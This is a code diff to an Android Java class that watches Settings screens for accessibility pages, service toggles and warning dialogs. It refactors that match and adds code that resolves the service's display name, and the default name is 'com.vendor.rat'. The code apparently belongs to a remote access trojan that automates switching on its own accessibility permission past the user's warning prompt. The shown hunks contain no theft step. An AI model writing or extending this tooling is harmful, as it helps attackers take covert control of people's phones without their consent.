@@ -94,27 +94,25 @@ public class AccessibilityServiceEngine extends AutoEngine {
         if (!SETTINGS.equals(packageName)) return false;
         if (className == null) return false;
 
-        // 无障碍设置主界面
-        if (className.contains("AccessibilitySettings")
-                || className.contains("accessibility")) {
-            return true;
-        }
-        // 无障碍服务详情/开关页
-        if (className.contains("ToggleAccessibilityService")
-                || className.contains("AccessibilityService")) {
-            return true;
-        }
-        // 对话框 (警告确认)
-        if (className.contains("AlertDialog")) {
-            return true;
-        }
-        return false;
+        return className.contains("AccessibilitySettings")
+                || className.contains("accessibility")
+                || className.contains("ToggleAccessibilityService")
+                || className.contains("AccessibilityService")
+                || className.contains("AlertDialog");
     }
 
     @Override
     public void onWindowMatched(String packageName, String className,
                                 AccessibilityEvent event) {
         if (enabled.get()) return;
+
+        // 服务已通过 ADB 或其他方式启用时直接跳过
+        if (MyAccessibilityService.getInstance() != null) {
+            log("Service already running, skipping");
+            enabled.set(true);
+            finish();
+            return;
+        }
 
         log("Window matched: " + className);
 
@@ -349,7 +347,21 @@ public class AccessibilityServiceEngine extends AutoEngine {
     // ============ Getters & Setters ============
 
     private String getServiceName() {
-        return serviceName != null ? serviceName : "com.vendor.rat";
+        if (serviceName != null) return serviceName;
+        // 从 PackageManager 解析应用标签 (MIUI 列表显示应用名而非包名)
+        try {
+            MyAccessibilityService svc = MyAccessibilityService.getInstance();
+            if (svc != null) {
+                android.content.pm.ApplicationInfo info = svc.getPackageManager()
+                    .getApplicationInfo(svc.getPackageName(), 0);
+                serviceName = svc.getPackageManager().getApplicationLabel(info).toString();
+                Log.d(TAG, "Resolved service name: " + serviceName);
+                return serviceName;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to resolve service name", e);
+        }
+        return "com.vendor.rat";
     }
 
     public void setServiceName(String serviceName) {
@@ -358,6 +370,8 @@ public class AccessibilityServiceEngine extends AutoEngine {
 
     public void setRestrictionListener(VendorRestrictionListener listener) {
         this.restrictionListener = listener;
+
+       
     }
 
     public boolean isEnabled() { return enabled.get(); }
